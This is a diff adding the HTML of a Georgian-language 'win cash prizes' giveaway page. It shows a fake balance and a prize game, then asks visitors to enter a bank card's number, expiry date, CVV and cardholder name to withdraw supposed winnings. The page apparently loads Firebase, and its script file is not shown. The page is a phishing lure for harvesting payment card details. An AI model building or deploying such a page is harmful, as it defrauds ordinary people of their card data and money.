@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./css/main.css" />
+    <link
+      rel="shortcut icon"
+      href="./assets/img/favicon.png"
+      type="image/x-icon" />
+    <title>მოიგე ფულადი პრიზები</title>
+  </head>
+  <body>
+    <header class="header">
+      <div class="header-wrapper">
+        <aside class="left">
+          <ul>
+            <li><i class="fa-solid fa-house"></i></li>
+            <li><i class="fa-solid fa-clock-rotate-left"></i></li>
+            <li><i class="fa-sharp fa-solid fa-money-check-dollar"></i></li>
+          </ul>
+        </aside>
+        <aside class="right">
+          <h4 class="balance-wrapper"><span class="winn-balance">0</span> ₾</h4>
+        </aside>
+      </div>
+    </header>
+    <aside class="middle">
+      <div class="home-page-wrapper">
+        <div class="rules-wrapper">
+          <h3>თამაშდება ფულადი პრიზები!!!</h3>
+          <h4 class="rules-red">თამაშის წესები!!!</h4>
+          <h5>1. გათამაშებაში მონაწილეობის მიღება შეგიძლიათ მხოლოდ ერთხელ.</h5>
+
+          <h5>
+            2. თამაშდება აღნიშნული ოდენობის პრიზები. 20₾, 25₾, 30₾, 50₾, 60₾,
+            70₾, 90₾, 100₾
+          </h5>
+          <h5>
+            3. მოგებული თანხა ავტომატურად აისახება ზემოთ მოცემულ ბალანსზე.
+          </h5>
+          <h5>
+            4. მოგებული თანხის გატანა შეგიძლიათ ნებისმიერი ბანკის პლასტიკურ
+            ბარათზე.
+          </h5>
+          <h5>
+            5. გათამაშებაში მონაწილეობის მისაღებად დააკლიკეთ ქვემით მოცემულ
+            ღილაკს.
+          </h5>
+          <div class="get-started-btn-wrapper">
+            <button class="get-started-btn">დაწყება</button>
+          </div>
+          <div class="Giveaway"></div>
+        </div>
+      </div>
+      <div class="withdraw-history-wrapper hidden">
+        <div class="withdraw-history-ussers"></div>
+      </div>
+      <div class="withdraw-wrapper hidden">
+        <h3 class="guest-winner"></h3>
+        <h5 class="withdraw-rules">
+          თანხის გასატანად საჭიროა ნებისმიერი ბანკის პლასტიკური ან ციფრული
+          ბარათის დამატება!
+        </h5>
+        <button class="transaction-btn hidden">ბოლო ტრანზაქციები</button>
+
+        <button class="add-card-btn">ბარათის დამატება</button>
+        <div class="add-card-wrapper hidden">
+          <div class="accept-wrapper hidden">
+            <i class="fa-solid fa-check"></i>
+          </div>
+          <div class="cashout-wrapper hidden">
+            <div class="card-info-wrapper">
+              <i class="fa-solid fa-xmark"></i>
+              <h3 class="card-title">ბარათი</h3>
+              <img
+                class="master-card-img"
+                src="./assets/img/mastercard.png"
+                alt="" />
+              <img class="visa-card-img" src="./assets/img/visa.png" alt="" />
+              <h6 class="card-info"></h6>
+            </div>
+
+            <button class="cashout-btn">თანხის გატანა</button>
+          </div>
+          <div class="add-card-validations">
+            <p class="titlecard">Card Number:</p>
+            <input
+              id="card-number"
+              class="card-input-value"
+              type="text"
+              placeholder="5488 0000 0000 0000"
+              maxlength="19" />
+            <div class="card-data-wrapper">
+              <div class="card-data-title-input">
+                <p class="titlecard">Expiration Data</p>
+                <input
+                  id="card-data"
+                  class="card-data-value"
+                  type="text"
+                  placeholder="mm/yy"
+                  maxlength="7" />
+              </div>
+              <div class="card-cvv-title-input">
+                <p class="titlecard">CVV</p>
+                <input
+                  id="card-cvv"
+                  type="text"
+                  placeholder="000"
+                  maxlength="3" />
+              </div>
+            </div>
+            <p class="titlecard">სახელი და გვარი</p>
+            <input id="card-name" type="text" placeholder="სახელი და გვარი" />
+          </div>
+          <br />
+
+          <button class="add-card-accept-btn">ბარათის დამატება</button>
+        </div>
+      </div>
+
+      <div class="started-page hidden">
+        <div class="start-wrapper">
+          <h3>შეიყვანეთ თქვენი სახელი</h3>
+          <input
+            class="winner-name"
+            type="text"
+            name="username"
+            id=""
+            required=""
+            placeholder="სახელი" />
+          <div class="nex-win-btn-wrapper">
+            <button class="next-game-page-btn">გაგრძელება</button>
+          </div>
+        </div>
+      </div>
+      <div class="game-page-wrapper hidden">
+        <h3 class="guest-title"></h3>
+        <div class="coin primary-loader">
+          <p class="animatednumb"></p>
+        </div>
+        <div class="win-started-wrapper">
+          <p class="gift-title">
+            პრიზის მისაღებად დააკლიკეთ ქვემოთ მოცემულ ღილაკს
+          </p>
+          <button class="win-started-btn">თამაში</button>
+          <button class="withdraw-btn hidden">თანხის გატანა</button>
+        </div>
+      </div>
+      <span class="loader hidden"></span>
+    </aside>
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/3.1.0/firebase.js"></script>
+    <script
+      src="https://kit.fontawesome.com/1272a139a6.js"
+      crossorigin="anonymous"></script>
+    <script src="./js/app.js"></script>
+  </body>
+</html>
